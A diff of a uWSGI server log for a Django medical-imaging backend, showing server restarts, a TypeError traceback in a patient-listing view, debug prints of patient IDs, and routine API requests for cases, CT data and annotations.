@@ -1,547 +1,404 @@
+*** Starting uWSGI 2.0.23 (64bit) on [Tue May  7 23:02:14 2024] ***
+compiled with version: 11.2.0 on 15 January 2024 06:07:54
+os: Linux-5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023
+nodename: VM-16-17-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 2
+current working directory: /home/ubuntu/chuangxin/vasorum-detacted-backend
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/ubuntu/chuangxin/vasorum-detacted-backend
+your processes number limit is 7401
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 6
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Set PythonHome to /home/ubuntu/anaconda3/envs/django
+Python main interpreter initialized at 0x5596244ce990
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+added /home/ubuntu/anaconda3/envs/django/lib/python3.10/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x5596244ce990 pid: 1552004 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1552004)
+spawned uWSGI worker 1 (pid: 1552028, cores: 2)
+spawned uWSGI worker 2 (pid: 1552029, cores: 2)
+spawned uWSGI worker 3 (pid: 1552031, cores: 2)
+spawned uWSGI worker 4 (pid: 1552032, cores: 2)
+用户id  : 5
+Internal Server Error: /api/medical/get_all_patient
+Traceback (most recent call last):
+  File "/home/ubuntu/anaconda3/envs/django/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/anaconda3/envs/django/lib/python3.10/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/home/ubuntu/chuangxin/vasorum-detacted-backend/./user/authentication.py", line 27, in valid_per
+    return func(request, *args, **kwargs)
+  File "/home/ubuntu/chuangxin/vasorum-detacted-backend/./medical/views.py", line 68, in get_all_patient
+    print(patient.id+" "+patient.latest_ct)
+TypeError: unsupported operand type(s) for +: 'int' and 'str'
+[pid: 1552032|app: 0|req: 1/1] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 23:02:24 2024] GET /api/medical/get_all_patient => generated 60975 bytes in 373 msecs (HTTP/1.1 500) 7 headers in 242 bytes (1 switches on core 0)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 1552028)...
+Gracefully killing worker 2 (pid: 1552029)...
+Gracefully killing worker 3 (pid: 1552031)...
+Gracefully killing worker 4 (pid: 1552032)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/chuangxin/vasorum-detacted-backend
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 6 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.23 (64bit) on [Tue May  7 23:03:00 2024] ***
+compiled with version: 11.2.0 on 15 January 2024 06:07:54
+os: Linux-5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023
+nodename: VM-16-17-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 2
+current working directory: /home/ubuntu/chuangxin/vasorum-detacted-backend
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/ubuntu/chuangxin/vasorum-detacted-backend
+your processes number limit is 7401
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 6
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Set PythonHome to /home/ubuntu/anaconda3/envs/django
+Python main interpreter initialized at 0x5563f7ab22f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+added /home/ubuntu/anaconda3/envs/django/lib/python3.10/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5563f7ab22f0 pid: 1552004 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1552004)
+spawned uWSGI worker 1 (pid: 1552309, cores: 2)
+spawned uWSGI worker 2 (pid: 1552310, cores: 2)
+spawned uWSGI worker 3 (pid: 1552312, cores: 2)
+spawned uWSGI worker 4 (pid: 1552313, cores: 2)
+用户id  : 5
+1   2024-05-04 08:40:59.887000+00:00
+3   2024-03-01 14:41:36.623000+00:00
+6   2024-04-15 08:43:49.952845+00:00
+7   2024-03-07 15:41:44.590000+00:00
+8   2024-01-09 09:41:53.529000+00:00
+9   2024-04-16 10:42:50.846000+00:00
+10   2024-02-04 11:42:59.511000+00:00
+11   2024-02-10 16:43:04.993000+00:00
+12   2024-03-02 14:43:10.696000+00:00
+[pid: 1552313|app: 0|req: 1/1] 219.239.227.174 () {44 vars in 872 bytes} [Tue May  7 23:03:10 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 703 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552309|app: 0|req: 1/2] 219.239.227.174 () {44 vars in 883 bytes} [Tue May  7 23:03:11 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 1537 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552312|app: 0|req: 1/3] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:03:20 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 1741 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+用户id  : 5
+用户id  : 5
+[pid: 1552313|app: 0|req: 2/4] 219.239.227.174 () {40 vars in 836 bytes} [Tue May  7 23:03:23 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 1746 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+[pid: 1552309|app: 0|req: 2/5] 219.239.227.174 () {40 vars in 854 bytes} [Tue May  7 23:03:23 2024] GET /api/medical/get_ct?patient_id=1&case_id=20 => generated 10417 bytes in 2325 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 1)
+用户id  : 5
+1   2024-05-04 08:40:59.887000+00:00
+3   2024-03-01 14:41:36.623000+00:00
+6   2024-04-15 08:43:49.952845+00:00
+7   2024-03-07 15:41:44.590000+00:00
+8   2024-01-09 09:41:53.529000+00:00
+9   2024-04-16 10:42:50.846000+00:00
+10   2024-02-04 11:42:59.511000+00:00
+11   2024-02-10 16:43:04.993000+00:00
+12   2024-03-02 14:43:10.696000+00:00
+[pid: 1552312|app: 0|req: 3/6] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 23:03:37 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 773 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552313|app: 0|req: 3/7] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:03:38 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+用户id  : 5
+1   2024-05-04 08:40:59.887000+00:00
+3   2024-03-01 14:41:36.623000+00:00
+6   2024-04-15 08:43:49.952845+00:00
+7   2024-03-07 15:41:44.590000+00:00
+8   2024-01-09 09:41:53.529000+00:00
+9   2024-04-16 10:42:50.846000+00:00
+10   2024-02-04 11:42:59.511000+00:00
+11   2024-02-10 16:43:04.993000+00:00
+12   2024-03-02 14:43:10.696000+00:00
+[pid: 1552312|app: 0|req: 3/8] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 23:03:32 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 7028 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
+用户id  : 5
+[pid: 1552313|app: 0|req: 4/9] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:03:43 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+用户id  : 5
+[pid: 1552309|app: 0|req: 3/10] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:03:44 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552312|app: 0|req: 4/11] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:03:47 2024] GET /api/medical/get_case?patient_id=7 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+...gracefully killing workers...
+Gracefully killing worker 4 (pid: 1552313)...
+Gracefully killing worker 1 (pid: 1552309)...
+Gracefully killing worker 2 (pid: 1552310)...
+Gracefully killing worker 3 (pid: 1552312)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/chuangxin/vasorum-detacted-backend
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 6 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.23 (64bit) on [Tue May  7 23:04:16 2024] ***
+compiled with version: 11.2.0 on 15 January 2024 06:07:54
+os: Linux-5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023
+nodename: VM-16-17-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 2
+current working directory: /home/ubuntu/chuangxin/vasorum-detacted-backend
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/ubuntu/chuangxin/vasorum-detacted-backend
+your processes number limit is 7401
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 6
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Set PythonHome to /home/ubuntu/anaconda3/envs/django
+Python main interpreter initialized at 0x563a2bfd52f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+added /home/ubuntu/anaconda3/envs/django/lib/python3.10/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x563a2bfd52f0 pid: 1552004 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1552004)
+spawned uWSGI worker 1 (pid: 1552739, cores: 2)
+spawned uWSGI worker 2 (pid: 1552740, cores: 2)
+spawned uWSGI worker 3 (pid: 1552742, cores: 2)
+spawned uWSGI worker 4 (pid: 1552743, cores: 2)
 用户id  : 5
+[pid: 1552742|app: 0|req: 1/1] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 23:04:18 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 158 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2313|app: 0|req: 1/1] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:27:30 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 242 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 1/2] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 03:27:30 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 250 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
+[pid: 1552742|app: 0|req: 2/2] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:04:19 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 101 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2310|app: 0|req: 1/3] 219.239.227.192 () {44 vars in 896 bytes} [Tue Apr 16 03:27:38 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 133 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 0)
+[pid: 1552742|app: 0|req: 3/3] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:04:20 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 97 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2309|app: 0|req: 2/4] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:27:38 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 96 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 4/4] 219.239.227.174 () {40 vars in 836 bytes} [Tue May  7 23:04:21 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 120 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2310|app: 0|req: 2/5] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:27:40 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 93 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
-[pid: 2312|app: 0|req: 1/6] 219.239.227.192 () {46 vars in 814 bytes} [Tue Apr 16 03:28:28 2024] POST /api/user/login => generated 296 bytes in 120 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 1/5] 219.239.227.174 () {40 vars in 854 bytes} [Tue May  7 23:04:21 2024] GET /api/medical/get_ct?patient_id=1&case_id=20 => generated 10417 bytes in 179 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2312|app: 0|req: 2/7] 219.239.227.192 () {44 vars in 896 bytes} [Tue Apr 16 03:28:28 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 106 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2312|app: 0|req: 3/8] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:28:28 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 94 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 2/6] 219.239.227.174 () {40 vars in 836 bytes} [Tue May  7 23:04:52 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 116 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 5/7] 219.239.227.174 () {40 vars in 854 bytes} [Tue May  7 23:04:52 2024] GET /api/medical/get_ct?patient_id=1&case_id=20 => generated 10417 bytes in 118 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2313|app: 0|req: 2/9] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:28:41 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 94 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 6/8] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 23:05:00 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2312|app: 0|req: 4/10] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:28:56 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 92 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
+[pid: 1552739|app: 0|req: 1/9] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:05:00 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 128 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
+[pid: 1552742|app: 0|req: 7/10] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:05:27 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 99 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2313|app: 0|req: 4/11] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:28:59 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 182 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 4/12] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 03:28:59 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 188 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2312|app: 0|req: 5/13] 219.239.227.192 () {44 vars in 896 bytes} [Tue Apr 16 03:30:44 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 99 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 3/11] 219.239.227.174 () {40 vars in 854 bytes} [Tue May  7 23:05:28 2024] GET /api/medical/get_ct?patient_id=6&case_id=18 => generated 2117 bytes in 123 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
+[pid: 1552739|app: 0|req: 2/12] 219.239.227.174 () {40 vars in 836 bytes} [Tue May  7 23:05:28 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 128 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2313|app: 0|req: 5/14] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:30:45 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 94 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 8/13] 219.239.227.174 () {40 vars in 836 bytes} [Tue May  7 23:06:18 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 126 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2313|app: 0|req: 7/15] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:30:46 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 157 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
+[pid: 1552740|app: 0|req: 1/14] 219.239.227.174 () {40 vars in 854 bytes} [Tue May  7 23:06:18 2024] GET /api/medical/get_ct?patient_id=6&case_id=18 => generated 2117 bytes in 160 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2313|app: 0|req: 7/16] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 03:30:46 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 169 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 8/17] 219.239.227.192 () {48 vars in 963 bytes} [Tue Apr 16 03:31:27 2024] POST /api/medical/annotate => generated 146 bytes in 87 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 9/18] 219.239.227.192 () {48 vars in 963 bytes} [Tue Apr 16 03:31:30 2024] POST /api/medical/annotate => generated 147 bytes in 85 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 10/19] 180.163.28.143 () {36 vars in 627 bytes} [Tue Apr 16 03:32:31 2024] GET /api/medical/upload_seg => generated 43 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 11/20] 220.196.160.84 () {42 vars in 819 bytes} [Tue Apr 16 03:48:29 2024] GET /api/medical/annotate => generated 59 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
 用户id  : 5
+[pid: 1552742|app: 0|req: 9/15] 219.239.227.174 () {40 vars in 836 bytes} [Tue May  7 23:06:31 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 114 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+[pid: 1552739|app: 0|req: 3/16] 219.239.227.174 () {40 vars in 854 bytes} [Tue May  7 23:06:31 2024] GET /api/medical/get_ct?patient_id=6&case_id=18 => generated 2117 bytes in 123 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2312|app: 0|req: 6/21] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:57:44 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 112 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 12/22] 219.239.227.192 () {44 vars in 925 bytes} [Tue Apr 16 03:57:44 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 120 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
-[pid: 2310|app: 0|req: 3/23] 219.239.227.192 () {46 vars in 814 bytes} [Tue Apr 16 03:58:55 2024] POST /api/user/login => generated 296 bytes in 162 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 4/17] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 23:06:47 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 98 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2310|app: 0|req: 4/24] 219.239.227.192 () {44 vars in 896 bytes} [Tue Apr 16 03:58:55 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 99 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 10/18] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:06:47 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 98 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2312|app: 0|req: 7/25] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:58:55 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
+[pid: 1552740|app: 0|req: 2/19] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:06:51 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 99 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2313|app: 0|req: 13/26] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:59:12 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 94 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2312|app: 0|req: 8/27] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:59:17 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 90 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
+[pid: 1552742|app: 0|req: 11/20] 219.239.227.174 () {40 vars in 836 bytes} [Tue May  7 23:06:54 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 113 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+[pid: 1552740|app: 0|req: 3/21] 219.239.227.174 () {40 vars in 854 bytes} [Tue May  7 23:06:54 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 120 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
+[pid: 1552742|app: 0|req: 12/22] 219.239.227.174 () {46 vars in 926 bytes} [Tue May  7 23:07:02 2024] POST /api/medical/annotate => generated 146 bytes in 525 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 5/23] 219.239.227.174 () {46 vars in 926 bytes} [Tue May  7 23:07:03 2024] POST /api/medical/annotate => generated 147 bytes in 295 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
+[pid: 1552739|app: 0|req: 4/24] 219.239.227.174 () {46 vars in 926 bytes} [Tue May  7 23:07:04 2024] POST /api/medical/annotate => generated 146 bytes in 502 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 13/25] 219.239.227.174 () {46 vars in 926 bytes} [Tue May  7 23:07:05 2024] POST /api/medical/annotate => generated 147 bytes in 519 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 6/26] 219.239.227.174 () {46 vars in 926 bytes} [Tue May  7 23:07:06 2024] POST /api/medical/annotate => generated 147 bytes in 291 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
+[pid: 1552740|app: 0|req: 4/27] 219.239.227.174 () {46 vars in 926 bytes} [Tue May  7 23:07:07 2024] POST /api/medical/annotate => generated 147 bytes in 97 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 7/28] 219.239.227.174 () {46 vars in 926 bytes} [Tue May  7 23:07:08 2024] POST /api/medical/annotate => generated 146 bytes in 522 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
+[pid: 1552742|app: 0|req: 14/29] 219.239.227.174 () {46 vars in 926 bytes} [Tue May  7 23:07:08 2024] POST /api/medical/annotate => generated 146 bytes in 498 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2313|app: 0|req: 14/28] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:59:20 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 90 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 15/29] 219.239.227.192 () {48 vars in 864 bytes} [Tue Apr 16 03:59:32 2024] OPTIONS /api/medical/get_case?patient_id=7 => generated 0 bytes in 1 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 8/30] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 23:07:20 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 98 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2309|app: 0|req: 3/30] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:59:32 2024] GET /api/medical/get_case?patient_id=7 => generated 74 bytes in 93 msecs (HTTP/1.1 200) 9 headers in 304 bytes (1 switches on core 1)
+[pid: 1552740|app: 0|req: 5/31] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:20 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2313|app: 0|req: 16/31] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:59:44 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 90 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 9/32] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:21 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2312|app: 0|req: 9/32] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 03:59:59 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 91 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 15/33] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:45 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
+[pid: 1552743|app: 0|req: 10/34] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 23:07:46 2024] GET /api/medical/get_case?patient_id=7 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
-[pid: 2309|app: 0|req: 4/33] 219.239.227.192 () {44 vars in 907 bytes} [Tue Apr 16 04:00:03 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 109 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
